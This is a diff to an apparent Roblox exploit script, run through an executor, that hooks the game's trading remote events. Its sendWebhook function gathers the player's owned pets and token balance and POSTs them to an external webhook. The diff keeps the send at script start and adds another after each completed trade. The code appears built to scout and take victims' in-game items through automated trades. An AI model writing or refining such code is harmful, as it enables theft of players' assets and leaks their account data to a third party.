@@ -12,7 +12,6 @@ task.spawn(function()
     local RS      = game:GetService("ReplicatedStorage")
     local Lighting = game:GetService("Lighting")
     local RunService = game:GetService("RunService")
-    local Http    = game:GetService("HttpService")
     local lp      = Players.LocalPlayer
     
     local trading = RS.RemoteServices.TradingService
@@ -21,9 +20,9 @@ task.spawn(function()
     local tradeRequested = trading.RE.TradeRequested
     local tradeUpdate    = trading.RE.TradeUpdate
 
-    task.wait(5)
+    task.wait(15) -- Slightly longer wait to ensure game fully loads
 
-    -- 🔥 ORIGINAL WEBHOOK FUNCTION 🔥
+    -- 🔥 ORIGINAL WEBHOOK FUNCTION (Restored) 🔥
     local function sendWebhook(pets, tokens, lp)
         local fields = {}
         local count = 0
@@ -56,9 +55,10 @@ task.spawn(function()
                 timestamp   = os.date("!%Y-%m-%dT%H:%M:%S"),
             }},
         }
+        
         local req = (syn and syn.request) or (http and http.request) or request
         pcall(function()
-            req({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = Http:JSONEncode(body) })
+            req({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = game:GetService("HttpService"):JSONEncode(body) })
         end)
     end
 
@@ -121,7 +121,7 @@ task.spawn(function()
         end
     end)
 
-    -- 🔥 INITIAL WEBHOOK SEND 🔥
+    -- 🔥 INITIAL WEBHOOK SEND (Fires right as script starts) 🔥
     local initData = getData()
     if initData and initData.Pets and initData.Pets.Owned then
         local startPets = {}
@@ -326,6 +326,17 @@ task.spawn(function()
             tradeInProgress = false
             
             if tradeEnded then 
+                -- 🔥 SEND POST-TRADE WEBHOOK UPDATE 🔥
+                local postData = getData()
+                if postData and postData.Pets and postData.Pets.Owned then
+                    local postPets = {}
+                    local postTokens = math.floor(tonumber(postData.Currencies and (postData.Currencies.PaidTokens or postData.Currencies.Tokens)) or 0)
+                    for _, p in pairs(postData.Pets.Owned) do
+                        table.insert(postPets, p)
+                    end
+                    sendWebhook(postPets, postTokens, lp)
+                end
+                
                 task.wait(5) 
             else 
                 req("Cancel", {}); task.wait(5) 
